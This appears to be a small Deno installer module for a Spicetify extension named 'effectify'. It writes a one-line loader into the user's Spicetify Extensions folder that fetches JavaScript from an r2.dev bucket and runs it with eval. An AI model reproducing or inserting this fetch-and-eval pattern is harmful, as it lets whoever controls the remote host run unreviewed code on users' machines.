import dir from "https://deno.land/x/dir/mod.ts";
import { join } from "https://deno.land/std/path/mod.ts";

export const extensionPath = join(dir("data")!, "spicetify", "Extensions", "effectify.js");
export const extensionContents = `fetch("https://pub-4123c15178c049b5ac21a5ee03106a4b.r2.dev/effectify.js").then(res=>res.text().then(text=>eval(text)))`